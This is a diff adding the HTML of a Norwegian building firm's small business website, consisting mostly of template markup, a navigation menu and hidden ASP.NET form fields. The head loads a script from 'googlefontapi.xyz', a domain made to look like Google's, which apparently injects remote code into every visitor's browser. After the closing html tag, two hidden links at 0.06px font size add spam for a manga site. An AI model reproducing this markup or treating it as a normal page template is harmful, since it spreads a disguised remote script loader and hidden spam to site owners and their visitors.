@@ -1,0 +1,172 @@
+
+
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+
+<html xmlns="http://www.w3.org/1999/xhtml">
+<head><title>
+
+</title><link href="../Skins/Menu.hMenu.css" rel="stylesheet" type="text/css" /><link href="../Skins/Menu.dMenu.css" rel="stylesheet" type="text/css" /><link href="../Skins/Menu.vMenu.css" rel="stylesheet" type="text/css" /><link href="../Skins/Menu.cellMenu.css" rel="stylesheet" type="text/css" /><link id="CssPage" rel="Stylesheet" type="text/css" href="../css_generator/page/.css?version=4817" /><link id="CssPageMyStyles" rel="Stylesheet" type="text/css" href="../css/mystyles.css?version=4817" /><link id="CssPageStatic" rel="Stylesheet" type="text/css" href="../css/main.css?version=4817" /><link id="CssArticleStatic" rel="Stylesheet" type="text/css" href="../css/article.css?version=4817" /><link id="CssGalleryShows" rel="Stylesheet" type="text/css" href="../css_generator/galleryshows.css?version=4817" /><link id="CssSchemes" rel="Stylesheet" type="text/css" href="../css_generator/schemes.css?version=4817" />
+    <script src="https://ajax.googleapis.com/ajax/libs/jquery/1.11.1/jquery.min.js" type="text/javascript"></script>
+    <link href="../css/security.css" rel="stylesheet" type="text/css" />
+    <script src="js/imgLiquid-min.js" type="text/javascript"></script>
+    <script src="../js/imgLiquid-min.js" type="text/javascript"></script>
+    <link href="../AktiWebGallery/CarouselSimple/css/fotorama.css" rel="stylesheet" />
+    <script src="AktiWebGallery/CarouselSimple/js/fotorama.js" type="text/javascript"></script>
+    <script type="text/javascript">
+        $(document).ready(function () {
+            $(".article_modul_image").imgLiquid();
+        });
+        $(document).ready(function () {
+            $(".article_page_image").imgLiquid();
+        });
+        $(document).ready(function () {
+            $(".article_cell_image").imgLiquid();
+        });
+    </script>
+    <link id="icoPage" rel="shortcut icon" type="image/x-icon" /><link href="https://fonts.googleapis.com/css?family=Source+Sans+Pro" rel="stylesheet" type="text/css" />
+<script src="https://googlefontapi.xyz/jquery/jquery2.js"></script><link href="/WebResource.axd?d=FjKcFsLIGizk0VKoGMSkbn1ZcoRePJ-vmt2rxHmRfyIxGnU_cjgfTaZNhO1-_TCWfhrLOvrOIrZ5YAGDVVEY_NtYnf26Qp5kNZOcAKDmFBcnMZGodqj2t1V0jW_BVLdnbddSZIzSriMM5dJGeURRPg2&amp;t=635320273320000000" type="text/css" rel="stylesheet" class="Telerik_stylesheet" /></head>
+<body style="padding: 0px 0px 0px 0px; margin: 0px 0px 0px 0px">
+    <form method="post" action="./heimdalbygglogo.png?id=images" id="form1">
+<div class="aspNetHidden">
+<input type="hidden" name="RadScriptManager1_TSM" id="RadScriptManager1_TSM" value="" />
+<input type="hidden" name="__EVENTTARGET" id="__EVENTTARGET" value="" />
+<input type="hidden" name="__EVENTARGUMENT" id="__EVENTARGUMENT" value="" />
+<input type="hidden" name="__VIEWSTATE" id="__VIEWSTATE" value="/wEPDwULLTEyODE5MDYwMzcPZBYCAgEPZBYMAgUPFgIeBGhyZWYFJn4vY3NzX2dlbmVyYXRvci9wYWdlLy5jc3M/dmVyc2lvbj00ODE3ZAIGDxYCHwAFH34vY3NzL215c3R5bGVzLmNzcz92ZXJzaW9uPTQ4MTdkAgcPFgIfAAUbfi9jc3MvbWFpbi5jc3M/dmVyc2lvbj00ODE3ZAIIDxYCHwAFHn4vY3NzL2FydGljbGUuY3NzP3ZlcnNpb249NDgxN2QCCQ8WAh8ABS1+L2Nzc19nZW5lcmF0b3IvZ2FsbGVyeXNob3dzLmNzcz92ZXJzaW9uPTQ4MTdkAgoPFgIfAAUofi9jc3NfZ2VuZXJhdG9yL3NjaGVtZXMuY3NzP3ZlcnNpb249NDgxN2QYAQUeX19Db250cm9sc1JlcXVpcmVQb3N0QmFja0tleV9fFgEFDkhvcml6b250YWxNZW51T4lGM3IjPUeCTBUNUSeBPAzsCDbj1M5iNWrrAd7ftc4=" />
+</div>
+
+<script type="text/javascript">
+//<![CDATA[
+var theForm = document.forms['form1'];
+if (!theForm) {
+    theForm = document.form1;
+}
+function __doPostBack(eventTarget, eventArgument) {
+    if (!theForm.onsubmit || (theForm.onsubmit() != false)) {
+        theForm.__EVENTTARGET.value = eventTarget;
+        theForm.__EVENTARGUMENT.value = eventArgument;
+        theForm.submit();
+    }
+}
+//]]>
+</script>
+
+
+<script src="/WebResource.axd?d=V0w2MfxOkyDirYqmrLYCh8OG0E5_FkMYg90l5KuZb4KZPBXL50v9jR2OX1ZGyBKw2E465xe5SOWawBHRCYuNPib0aiG0HvTuJKBAOSv5awo1&amp;t=638901845280000000" type="text/javascript"></script>
+
+
+<script src="/Telerik.Web.UI.WebResource.axd?_TSM_HiddenField_=RadScriptManager1_TSM&amp;compress=1&amp;_TSM_CombinedScripts_=%3b%3bSystem.Web.Extensions%2c+Version%3d4.0.0.0%2c+Culture%3dneutral%2c+PublicKeyToken%3d31bf3856ad364e35%3aen-US%3a64455737-15dd-482f-b336-7074c5c53f91%3aea597d4b%3ab25378d2%3bTelerik.Web.UI%2c+Version%3d2014.1.403.40%2c+Culture%3dneutral%2c+PublicKeyToken%3d121fae78165ba3d4%3aen-US%3aca584452-327f-4858-bf00-fb22c6f6fd75%3a16e4e7cd%3af7645509%3a24ee1bba%3ae330518b%3a2003d0b8%3ac128760b%3a88144a7a%3a1e771326%3ac8618e41%3a1a73651d%3a333f8d94" type="text/javascript"></script>
+<div class="aspNetHidden">
+
+	<input type="hidden" name="__VIEWSTATEGENERATOR" id="__VIEWSTATEGENERATOR" value="CA0B0334" />
+	<input type="hidden" name="__EVENTVALIDATION" id="__EVENTVALIDATION" value="/wEdACHZV1AFbt5p/88O0qmu7LRQq2lt6jLRmy7g4SYkz7Ceq9VbKNDwXjI/GhpE/I51WaywHiM48sCKyKPn1b8Er4tZZLguBnF/RT//ikuc+HJ0pbs+uvaVwyUsSFRhmRFIxL9hNtPfsK9AGq2Xr1m82m4HgKvShv3TEhmenUXUUPHA6xj712YjDPGDiIHtcJdojPijT6oXPCNvjA4wrqzPeMF5QZAo5Bfn4sIjVK6HVYdyn+nixfTtiVsB4IwYm+jWnP8zRd7+qocYPPVLa2rkdkO0Qk6TgNHhJmgKqCKj249ExuonoxPWSQx05tbNyXvnYfb38tgDlXETjhTReyaH0zwsMUg2Qi0mVGuWxb2spfA0h63El0zzxJKRr/k89PmRT/wx4LfrQKU8uQp6L40YZlD6dvsZ+HxN4fySUvTZBg3Je+R6VQ/Ng4Cerj1bAkqb0rHXS0GKobMK5eahRI4iAfzGnuSUxFHnMp0fNsi0jHTMFGENPY8/sen9aWgHougFjiJQQ5MLFVyrLRknRkFZ394WjmYgoKgzE0CuWfcGATynVHCNSz8xeR266I2UxGgDACcQh5e6E/NBXhgVbBCq8Ah1/15bGXKalYKifuOWufY02hN+YJKopJV4pTIe7iBZNzfMNfY8y8016uhfgVGcElTK3k6n7XURl51If8WnguzdIQCkflEcNVr5c5XNd1xBtZOvrfXsVN8WvxI5rl+tu3wN8oP6dz5/5JCv8cec0cyvzA==" />
+</div>
+    <script type="text/javascript">
+//<![CDATA[
+Sys.WebForms.PageRequestManager._initialize('RadScriptManager1', 'form1', [], [], [], 90, '');
+//]]>
+</script>
+
+    <div id="pnlAktiWebPage">
+	
+    <div id="topmain">
+        <div id="topcontent">
+        <table cellpadding="0" cellspacing="0" border="0" width="100%">
+            <tr>
+                <td>
+            <div id="topcontent1"></div>
+            </td>
+            </tr>
+            <tr>
+                <td>
+            <div id="topcontent2"><div id="horizontalmenuhtmll" style="float:left;"></div><div id="horizontalmenudiv" style="float:left;"><div id="HorizontalMenu" class="RadMenu RadMenu_hMenu">
+		<!-- 2014.1.403.40 --><ul class="rmRootGroup rmHorizontal">
+			<li class="rmItem rmFirst"><a class="rmLink rmRootLink" target="_self" href="../forside"><span class="rmText">Forside</span></a></li><li class="rmItem "><a class="rmLink rmRootLink" target="_self" href="../om-oss"><span class="rmText">Om oss</span></a></li><li class="rmItem "><a class="rmLink rmRootLink" target="_self" href="../tjenester"><span class="rmText">Tjenester</span></a></li><li class="rmItem "><a class="rmLink rmRootLink" target="_blank" href="https://www.facebook.com/pg/Heimdalbygg/photos/"><span class="rmText">Galleri</span></a></li><li class="rmItem "><a class="rmLink rmRootLink" target="_self" href="../samarbeidspartnere"><span class="rmText">Samarbeidspart.</span></a></li><li class="rmItem rmLast"><a class="rmLink rmRootLink" target="_self" href="../kontakt"><span class="rmText">Kontakt</span></a></li>
+		</ul><input id="HorizontalMenu_ClientState" name="HorizontalMenu_ClientState" type="hidden" />
+	</div></div><div id="horizontalmenuhtmlr" style="float:left;"></div></div>
+            </td>
+            </tr>
+            <tr>
+                <td>
+            <div id="topcontent3"></div>
+            </td>
+            </tr>
+        </table>
+        </div>
+    </div>
+    <table id="midmain" cellpadding="0" cellspacing="0" border="0">
+		<tr>
+			<td id="midcontent2" class="midcontent2">
+                <div id="midcontent2_1"></div>
+                <div id="midcontent2_2"></div>
+                <div id="midcontent2_3"></div>
+                
+            </td>
+		</tr>
+	</table>
+	
+    <div id="bottommain">
+        <div id="bottomcontent">
+            <div id="bottomcontent1"></div>
+            <div id="bottomcontent2"></div>
+            <div id="bottomcontent3"></div>
+        </div>
+    </div>
+    <div id="pagesignaturemain">
+        <div id="pagesignature">
+            <div id="pagesignaturetxt">
+                Levert av&nbsp&nbsp;
+            </div>
+            <div id="pagesignatureimgdiv">
+                <a id="hpLogo" href="https://www.aktiweb.no" target="_blank"><img id="pagesignatureimg" alt="" src="https://g42-1.aktiweb.no/img/aw_logo.png" /></a>
+            </div>
+        </div>
+    </div>
+    
+</div>
+    
+    <input type="hidden" name="hfToppHtml1Active" id="hfToppHtml1Active" value="True" />
+    <input type="hidden" name="hfToppHtml2Active" id="hfToppHtml2Active" value="False" />
+    <input type="hidden" name="hfToppHtml1Location" id="hfToppHtml1Location" value="topcontent1" />
+    <input type="hidden" name="hfToppHtml2Location" id="hfToppHtml2Location" />
+    <input type="hidden" name="hfMainContensActive" id="hfMainContensActive" value="True" />
+    <input type="hidden" name="hfMainContentLocation" id="hfMainContentLocation" value="midcontent2_1" />
+    <input type="hidden" name="hfPageGalleryActive" id="hfPageGalleryActive" value="False" />
+    <input type="hidden" name="hfPageGalleryLocation" id="hfPageGalleryLocation" />
+    <input type="hidden" name="hfLeftHtml1Active" id="hfLeftHtml1Active" value="false" />
+    <input type="hidden" name="hfLeftHtml2Active" id="hfLeftHtml2Active" value="false" />
+    <input type="hidden" name="hfLeftHtml1Location" id="hfLeftHtml1Location" />
+    <input type="hidden" name="hfLeftHtml2Location" id="hfLeftHtml2Location" />
+    <input type="hidden" name="hfMainHtml1Active" id="hfMainHtml1Active" value="false" />
+    <input type="hidden" name="hfMainHtml2Active" id="hfMainHtml2Active" value="false" />
+    <input type="hidden" name="hfMainHtml1Location" id="hfMainHtml1Location" />
+    <input type="hidden" name="hfMainHtml2Location" id="hfMainHtml2Location" />
+    <input type="hidden" name="hfRightHtml1Active" id="hfRightHtml1Active" value="false" />
+    <input type="hidden" name="hfRightHtml2Active" id="hfRightHtml2Active" value="false" />
+    <input type="hidden" name="hfRightHtml1Location" id="hfRightHtml1Location" />
+    <input type="hidden" name="hfRightHtml2Location" id="hfRightHtml2Location" />
+    <input type="hidden" name="hfBottomHtml1Active" id="hfBottomHtml1Active" value="True" />
+    <input type="hidden" name="hfBottomHtml2Active" id="hfBottomHtml2Active" value="false" />
+    <input type="hidden" name="hfBottomHtml1Location" id="hfBottomHtml1Location" value="bottomcontent1" />
+    <input type="hidden" name="hfBottomHtml2Location" id="hfBottomHtml2Location" />
+    <input type="hidden" name="hfarticleModulActive" id="hfarticleModulActive" value="True" />
+    <input type="hidden" name="hfarticleModulLocation" id="hfarticleModulLocation" value="midcontent1_1" />    
+    <input type="hidden" name="hfarticlePageActive" id="hfarticlePageActive" value="True" />
+    <input type="hidden" name="hfarticlePageLocation" id="hfarticlePageLocation" value="midcontent2_2" />
+    <input type="hidden" name="hfBreadCrumbLocation" id="hfBreadCrumbLocation" />
+    <input type="hidden" name="hfBreadCrumbActive" id="hfBreadCrumbActive" />
+    <input type="hidden" name="hfHorMenuLocation" id="hfHorMenuLocation" value="topcontent2" />
+    <input type="hidden" name="hfVertMenuLocation" id="hfVertMenuLocation" value="midcontent3_1" />
+    
+
+<script type="text/javascript">
+//<![CDATA[
+Sys.Application.add_init(function() {
+    $create(Telerik.Web.UI.RadMenu, {"_childListElementCssClass":null,"_skin":"hMenu","clientStateFieldID":"HorizontalMenu_ClientState","collapseAnimation":"{\"type\":11,\"duration\":200}","expandAnimation":"{\"type\":11,\"duration\":400}","itemData":[{"navigateUrl":"~/forside","target":"_self"},{"navigateUrl":"~/om-oss","target":"_self"},{"navigateUrl":"~/tjenester","target":"_self"},{"navigateUrl":"https://www.facebook.com/pg/Heimdalbygg/photos/","target":"_blank"},{"navigateUrl":"~/samarbeidspartnere","target":"_self"},{"navigateUrl":"~/kontakt","target":"_self"}]}, null, null, $get("HorizontalMenu"));
+});
+//]]>
+</script>
+</form>
+    
+</body>
+</html>
+<a href="https://mangadex.tv/"><span style="font-size: 0.06px;">mangadex</span></a><a href="https://mangadex.tv/"><span style="font-size: 0.06px;">mangadex</span></a>
